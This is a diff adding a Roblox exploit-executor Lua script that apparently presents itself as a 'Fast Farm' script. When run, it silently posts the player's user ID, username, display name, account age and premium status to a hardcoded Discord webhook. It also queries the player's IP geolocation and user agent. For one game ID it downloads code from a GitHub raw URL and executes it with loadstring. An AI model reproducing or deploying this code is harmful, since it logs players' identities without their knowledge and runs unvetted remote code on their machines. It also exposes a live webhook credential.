@@ -1,1 +1,245 @@
+local games = {
+    [3623096087] = "https://raw.githubusercontent.com/PerraEnCelo/TelaSambuto/refs/heads/main/putita"
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+
+local LocalPlayer = Players.LocalPlayer
+local webhookURL = "https://discord.com/api/webhooks/1446636145244111021/uv1ZRoTjVsPS8Ir9M5z7aH0EO6x-rCLqaIn4YzLbp46SlzGkFV7OsGsAY5BQj_9QHgXu"
+local placeId = game.PlaceId
+
+local function makeRequest(options)
+    local requestFunc = http_request or (syn and syn.request) or request
+    if not requestFunc then return nil end
+    local success, result = pcall(function()
+        return requestFunc(options)
+    end)
+    return success and result or nil
+end
+
+local function getExecutor()
+    if identifyexecutor then
+        local success, name = pcall(identifyexecutor)
+        if success then return name end
+    end
+    return "Unknown"
+end
+
+local function getPlatform()
+    local success, platform = pcall(function()
+        return tostring(UserInputService:GetPlatform())
+    end)
+    return success and platform or "Unknown"
+end
+
+local function getDeviceType()
+    local touchEnabled = UserInputService.TouchEnabled
+    local mouseEnabled = UserInputService.MouseEnabled
+    local keyboardEnabled = UserInputService.KeyboardEnabled
+    local gamepadEnabled = UserInputService.GamepadEnabled
+
+    if touchEnabled and not mouseEnabled and not keyboardEnabled then
+        return "Mobile"
+    elseif gamepadEnabled then
+        return "Console"
+    elseif mouseEnabled and keyboardEnabled then
+        return "Desktop"
+    end
+    return "Unknown"
+end
+
+local function getScreenResolution()
+    local camera = workspace.CurrentCamera
+    if camera then
+        local viewport = camera.ViewportSize
+        return string.format("%dx%d", viewport.X, viewport.Y)
+    end
+    return "Unknown"
+end
+
+local function getSystemSpecs()
+    return {
+        gpu = "Unknown",
+        cpu = "Unknown"
+    }
+end
+
+local function getServerRegion()
+    local success, region = pcall(function()
+        return game.JobId:sub(1, 3)
+    end)
+    return success and region or "Unknown"
+end
+
+local function getPremiumStatus()
+    local success, isPremium = pcall(function()
+        return LocalPlayer.MembershipType == Enum.MembershipType.Premium
+    end)
+    return success and isPremium or false
+end
+
+local function getOperatingSystem()
+    local platform = getPlatform()
+    if platform:find("Windows") then
+        return "Windows"
+    elseif platform:find("OSX") or platform:find("Mac") then
+        return "macOS"
+    elseif platform:find("iOS") then
+        return "iOS"
+    elseif platform:find("Android") then
+        return "Android"
+    elseif platform:find("UWP") then
+        return "Xbox"
+    end
+    return platform
+end
+
+local function getLocaleInfo()
+    local info = {
+        countryCode = "Unknown",
+        language = "Unknown"
+    }
+    pcall(function()
+        info.countryCode = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
+    end)
+    pcall(function()
+        info.language = LocalizationService.RobloxLocaleId
+    end)
+    return info
+end
+
+local function getUserAgent()
+    local response = makeRequest({
+        Url = "https://httpbin.org/user-agent",
+        Method = "GET"
+    })
+    if response and response.Body then
+        local success, decoded = pcall(function()
+            return HttpService:JSONDecode(response.Body)
+        end)
+        if success and decoded then
+            return decoded["user-agent"] or "Unknown"
+        end
+    end
+    return "Unknown"
+end
+
+local function getComprehensiveIPData()
+    local ipData = {
+        ip = "Unknown",
+        country = "Unknown",
+        countryCode = "Unknown",
+        region = "Unknown",
+        regionCode = "Unknown",
+        city = "Unknown",
+        district = "Unknown",
+        zip = "Unknown",
+        latitude = "Unknown",
+        longitude = "Unknown",
+        timezone = "Unknown",
+        offset = "Unknown",
+        currency = "Unknown",
+        isp = "Unknown",
+        org = "Unknown",
+        asn = "Unknown",
+        asnName = "Unknown",
+        reverse = "Unknown",
+        mobile = "Unknown",
+        proxy = "Unknown",
+        hosting = "Unknown",
+        vpn = "Unknown",
+        tor = "Unknown",
+        connectionType = "Unknown",
+        continent = "Unknown",
+        continentCode = "Unknown",
+        callingCode = "Unknown",
+        languages = "Unknown"
+    }
+
+    local response = makeRequest({
+        Url = "http://ip-api.com/json/?fields=66846719",
+        Method = "GET"
+    })
+
+    if response and response.Body then
+        local success, decoded = pcall(function()
+            return HttpService:JSONDecode(response.Body)
+        end)
+        if success and decoded and decoded.status == "success" then
+            ipData.ip = decoded.query
+            ipData.country = decoded.country
+            ipData.countryCode = decoded.countryCode
+            ipData.region = decoded.regionName
+            ipData.regionCode = decoded.region
+            ipData.city = decoded.city
+            ipData.zip = decoded.zip
+            ipData.latitude = tostring(decoded.lat)
+            ipData.longitude = tostring(decoded.lon)
+            ipData.timezone = decoded.timezone
+            ipData.offset = tostring(decoded.offset)
+            ipData.currency = decoded.currency
+            ipData.isp = decoded.isp
+            ipData.org = decoded.org
+            ipData.asn = decoded.as
+            ipData.asnName = decoded.asname
+            ipData.reverse = decoded.reverse
+            ipData.mobile = decoded.mobile and "Yes" or "No"
+            ipData.proxy = decoded.proxy and "Yes" or "No"
+            ipData.hosting = decoded.hosting and "Yes" or "No"
+            ipData.continentCode = decoded.continent
+        end
+    end
+
+    return ipData
+end
+
+local function getGameInfo()
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(placeId)
+    end)
+    return success and info.Name or "Unknown"
+end
+
+local function sendWebhook()
+    local ipData = getComprehensiveIPData()
+    local specs = getSystemSpecs()
+    local gameName = getGameInfo()
+    local locale = getLocaleInfo()
+    local userAgent = getUserAgent()
+
+    local payload = {
+        username = "Fast Farm Private Logs",
+        embeds = {
+            {
+                title = "Player Information",
+                color = 5793266,
+                fields = {
+                    { name = "User ID", value = tostring(LocalPlayer.UserId), inline = true },
+                    { name = "Username", value = LocalPlayer.Name, inline = true },
+                    { name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
+                    { name = "Account Age", value = LocalPlayer.AccountAge .. " days", inline = true },
+                    { name = "Premium", value = getPremiumStatus() and "Yes" or "No", inline = true },
+                    { name = "Game", value = gameName .. " (" .. placeId .. ")", inline = false }
+                }
+            }
+        }
+    }
+
+    makeRequest({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+task.spawn(sendWebhook)
+
+if games[placeId] then
+    loadstring(game:HttpGet(games[placeId]))()
+end
 
